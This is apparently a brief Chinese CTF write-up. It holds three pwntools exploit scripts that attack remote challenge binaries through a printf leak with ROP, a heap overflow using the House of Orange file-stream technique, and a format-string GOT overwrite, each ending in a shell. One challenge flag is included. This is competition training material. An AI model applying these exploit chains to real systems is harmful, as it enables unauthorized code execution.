# CTF
比较简单就不多说了.
# 红包
`pwnable.tw-calc`的变形,直接printf泄漏+溢出ROP
```python
from pwn import *
context.log_level='debug'
context.arch='amd64'
#p=process('./pwn')
p=remote("183.129.189.60",10001)
p.sendlineafter("?\n","Y")

p.sendafter(": ","%2$p".format().ljust(50,'A'))
got=0x000000000601fa0
main=0x4008e7
#gdb.attach(p,'b *printf')
p.sendlineafter("us?\n",str(-1))
p.readuntil("?\n")
for x in range(46):
	p.sendline("+")
p.sendline(str(main))
p.sendline(str(0))
for x in range(0xff-46-2):
	p.sendline("+")
p.readuntil("y much ")
base=int(p.read(14),16)-(0x7ffff7dd3790-0x7ffff7a0d000)
log.warning(hex(base))
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.sendlineafter("?\n","Y")
p.sendafter(": ","n132!\n")
p.sendlineafter("us?\n",str(-1))
p.readuntil("?\n")
for x in range(46):
	p.sendline("+")
libc.address=base
sys=libc.sym['system']
sh=libc.search('/bin/sh\x00').next()
rdi=0x0000000000400b73
p.sendline(str(rdi))
p.sendline(str(0))
p.sendline(str(sh&0xffffffff))
p.sendline(str(sh>>32))
p.sendline(str(sys&0xffffffff))
p.sendline(str(sys>>32))
for x in range(0xff-46-6):
	p.sendline("+")
p.readuntil("y much ")

p.interactive('n132>')
```
# hardpwn
堆溢出 泄漏+orange getshell
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(size):
	cmd(1)
	cmd(size)
def edit(idx,size,c):
	cmd(2)
	cmd(idx)
	cmd(size)
	p.sendafter(":",(c))
def free(idx):
	cmd(3)
	cmd(idx)
def show(idx):
	cmd(4)
	cmd(idx)
context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p=process('./pwn')
p=remote("183.129.189.60",10026)
add(0x98)#0
add(0x98)#1
add(0x98)#2
add(0x98)#3
add(0x98)#4
free(1)
edit(0,0x98+0x8,"A"*0xa0)
show(0)
p.readuntil("A"*0xa0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)
edit(0,0x98+0x8,"A"*0x98+p64(0xa1))
log.warning(hex(base))
free(3)
edit(0,0x98+0x8+8,"A"*0xa8)
show(0)
p.readuntil("A"*0xa8)
heap=u64(p.readline()[:-1].ljust(8,'\x00'))#-0x1e0
log.warning(hex(heap))
edit(0,0x98+0x8+8,"A"*0x98+p64(0xa1)+p64(0x7ffff7dd1b78-0x7ffff7a0d000+base))
add(0x98)#1

fio=heap
libc.address=base
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
edit(2,0x200,"A"*0x90+fake)
#gdb.attach(p,'')
cmd(1)
cmd(666)
p.interactive('n132>')
#flag{b342aeed-27c0-42cf-92d2-071f0020d809}
```
# medialpwn
fmtstr
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
p = remote('183.129.189.60',10003)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p = process('./pwn')
pay="%3$p"
p.sendlineafter(": \n",pay)
base=int(p.readline(),16)-(0x7ffff7b04260-0x7ffff7a0d000)
log.warning(hex(base))

libc.address=base
one=libc.sym['system']
p1=one&0xffff
r2=(one>>16)&0xffff
r3=(one>>32)&0xffff
def cal(a,b):
	if(b<a):
		return 0x10000+b-a
	return b-a
p2=cal(p1,r2)
p3=cal(r2,r3)
aim=0x000000000601028
pay="%{}c%70$ln%{}c%71$hn%{}c%72$hn".format(p1,p2,p3).ljust(0x200,'\x00')+p64(aim)+p64(aim+2)+p64(aim+4)
p.sendafter(": \n",pay.ljust(0x400,'\x00'))
log.warning(hex(p1))
log.warning(hex(p2))
log.warning(hex(p3))
p.sendlineafter(": \n",str('/bin/sh\x00'))
#gdb.attach(p)
p.interactive()
```
